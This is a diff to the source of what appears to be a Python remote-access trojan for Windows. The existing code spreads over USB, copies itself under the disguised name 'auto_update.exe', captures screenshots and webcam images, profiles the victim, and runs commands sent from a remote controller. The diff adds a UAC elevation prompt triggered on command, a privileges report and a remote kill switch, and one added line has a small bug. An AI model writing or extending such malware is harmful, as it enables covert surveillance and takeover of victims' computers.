@@ -31,6 +31,7 @@ __user__ = os.path.expanduser('~').split('\\')[-1]
 try:
     cam = vidcap.new_Dev(0, 0)
     web_camera = str(cam.getdisplayname())
+    del cam
 except:
     web_camera = 'NoDevice'
 
@@ -44,6 +45,7 @@ except IOError:
 
 Kernel32 = ctypes.windll.kernel32
 User32 = ctypes.windll.user32
+Shell32 = ctypes.windll.shell32
 Gdi32 = ctypes.windll.gdi32
 Psapi = ctypes.windll.psapi
 
@@ -192,7 +194,7 @@ class UsbSpread(threading.Thread):
 
 
 def from_device():
-    if ctypes.windll.shell32.IsUserAnAdmin() == 1:
+    if Shell32.IsUserAnAdmin() == 1:
         destination = os.path.join(os.path.expanduser('~'), 'iDocuments', 'auto_update.exe')
         try: shutil.copyfile(sys.argv[0], destination)
         except: pass
@@ -223,6 +225,7 @@ def pc_info():
         'os': __os__,
         'protection': str(active),
         'user': __user__,
+        'privileges': str(Shell32.IsUserAnAdmin()),
         'inputdevice': audio_input,
         'webcamdevice': web_camera,
         'activewindowtitle': get_window_title(),
@@ -338,6 +341,33 @@ def exec_(cmde):
     else:
         return "Enter a command.\n"
 
+def uac_escalation(argv=None, debug=False):
+    if argv is None and Shell32.IsUserAnAdmin():
+        return True
+    if argv is None:
+        argv = sys.argv
+    if hasattr(sys, '_MEIPASS'):
+        arguments = map(unicode, argv[1:])
+    else:
+        arguments = map(unicode, argv)
+    argument_line = u' '.join(arguments)
+    executable = unicode(sys.executable)
+    ret = Shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
+    if int(ret) <= 32:
+        return False
+    return None
+
+def run_as_admin():
+    ret = uac_escalation()
+    if ret is True:
+        return 'uacAlready'
+    elif ret is None:
+        return 'uacSucces'
+    else:
+        return 'uacError'
+
+def terminate():
+    sys.exit(0)
 
 def has_hidden_attribute(filepath):
     try:
@@ -365,6 +395,7 @@ def get_screenshot():
 
 
 def webcam_shot():
+    cam = vidcap.new_Dev(0, 0)
     buff, width, height = cam.getbuffer()
     return str({
         'webcambits': zlib.compress(buff),
@@ -504,6 +535,8 @@ class ChildSocket(threading.Thread):
                     stdoutput = terminateProcess(int(data.split(' ')[1]))
                 elif data.startswith('runscript '):
                     stdoutput = execute(data[10:])
+                elif data.startswith('runasadmin'):
+                    stdoutput = run_as_admin()
                 elif data.startswith('ls'):
                     stdoutput = ls()
                 elif data.startswith('myinfo'):
@@ -636,6 +669,9 @@ def from_autostart():
                 if data == 'info':
                     send(s, pc_info(), mode)
                     continue
+                elif data == 'runasadmin':
+                    send(s, run_as_admin(), mode)
+                    continue
                 if data == 'getScreen':
                     send(s, get_screenshot(), mode)
                     continue
@@ -653,6 +689,8 @@ def from_autostart():
                         if data == "lock":
                             active = False
                             break
+                        if data == 'terminateServer':
+                            os._exit(1)
                         if data == 'info':
                             stdoutput = pc_info()
                         elif data.startswith('startChildSocket'):
@@ -661,6 +699,8 @@ def from_autostart():
                             stdoutput = get_screenshot()
                         elif data == 'getWebcam':
                             stdoutput = webcam_shot()
+                        elif data == 'runasadmin':
+                            stdoutput == run_as_admin()
                         else:
                             stdoutput = exec_(data)
                         send(s, stdoutput, mode=mode)
